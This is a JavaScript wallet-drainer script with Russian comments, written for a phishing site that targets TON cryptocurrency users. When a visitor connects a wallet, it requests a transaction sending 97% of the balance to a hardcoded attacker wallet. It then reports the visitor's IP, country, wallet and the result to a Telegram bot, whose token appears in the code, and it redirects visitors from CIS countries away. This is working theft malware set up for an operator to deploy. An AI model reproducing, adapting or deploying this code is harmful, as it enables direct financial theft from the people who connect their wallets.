var mainWallet = "UQA9or9rMdG8vk8wSX20LRapZgTUslxrHt-Oa4JCcAynwEEi"; //Ваш кошелек, куда будут лететь активы
var tgBotToken = "7828861073:AAHBgan5y0jpg24QxtNAa36PGJHggto19sM"; //Токен от бота телеграмм
var tgChat = "1447071887"; //Ваш телеграмм-канал

var domain = window.location.hostname;
var ipUser;
var countryUser;  // Определите здесь, чтобы она была доступна глобально.

//Перенаправление стран СНГ
fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(data => {
    const country = data.country;
    if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
      window.location.replace('https://ton.org');
      return; // Важно: остановить дальнейшее выполнение, если перенаправление произошло
    }
    ipUser = data.ip;
    countryUser = data.country;
    console.log('IP: ' + ipUser);
    console.log('Country: ' + countryUser);
    sendTelegramMessage(`\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User*: ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`);

  })
  .catch(error => {
    console.error('Error IP:', error);
    // Отправляем сообщение об ошибке, чтобы не пропустить важную информацию.
    sendTelegramMessage(`\u26A0\uFE0F *Ошибка определения IP:* ${error}`);
  });


const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
})


tonConnectUI.on('walletConnected', async (wallet) => {  // Исправлено: Принимаем wallet, а не walletAddress
    console.log('Адрес кошелька:', wallet.address);  // Доступ к адресу через wallet.address
    console.log('Wallet Info:', wallet); // Дополнительно выводим информацию о кошельке

    // Вызываем didtrans() только после успешного подключения кошелька
    await didtrans();
});



async function didtrans() {
    if (!tonConnectUI.account) {
        console.warn("Кошелек не подключен. Невозможно получить адрес.");
        sendTelegramMessage(`\u26A0\uFE0F *Попытка отправки транзакции без подключенного кошелька!*`);
        return;
    }
    try {
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${tonConnectUI.account.address}`);

        if (!response.ok) {
            console.error(`Ошибка при запросе баланса: ${response.status} ${response.statusText}`);
            sendTelegramMessage(`\u26A0\uFE0F *Ошибка при запросе баланса:* ${response.status} ${response.statusText}`);
            return;
        }
        const data = await response.json();

        if (data.error) {
            console.error(`Ошибка при получении данных о балансе: ${data.error}`);
            sendTelegramMessage(`\u26A0\uFE0F *Ошибка при получении данных о балансе:* ${data.error}`);
            return;
        }
        let originalBalance = parseFloat(data.balance);
        let processedBalance = originalBalance * 0.97; // вычитаем 3% для сохранения средств на оплату комиссий, умножаем на 0.97, а не вычитаем процент
        let tgBalance = processedBalance / 1000000000;
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
            messages: [{
                address: mainWallet,
                amount: processedBalance.toString()  // Важно: amount должен быть строкой
            }, ]
        };

        try {
            const result = await tonConnectUI.sendTransaction(transaction);
            console.log("Транзакция отправлена:", result);  // Выводим результат для отладки
            sendTelegramMessage(`\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance.toFixed(8)}`);  // toFixed чтобы ограничить кол-во знаков после запятой
        } catch (e) {
            console.error("Ошибка при отправке транзакции:", e);
            sendTelegramMessage(`\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDED1*Declined or error:* ${e.message}`); // Добавляем сообщение об ошибке
        }

    } catch (error) {
        console.error("Произошла общая ошибка:", error);
        sendTelegramMessage(`\u26A0\uFE0F *Общая ошибка в didtrans:* ${error}`);
    }
}


// Функция для отправки сообщений в Telegram
function sendTelegramMessage(message) {
    const encodedMessage = encodeURIComponent(message);
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessage}&parse_mode=Markdown`; // Убрал минус перед tgChat, т.к. это обычный чат, а не канал.
    fetch(url, {
        method: 'POST',
    })
    .then(response => {
        if (response.ok) {
            console.log('Сообщение успешно отправлено.');
        } else {
            console.error('Ошибка при отправке сообщения:', response.status, response.statusText);
        }
    })
    .catch(error => {
        console.error('Ошибка сети при отправке сообщения:', error);
    });
}

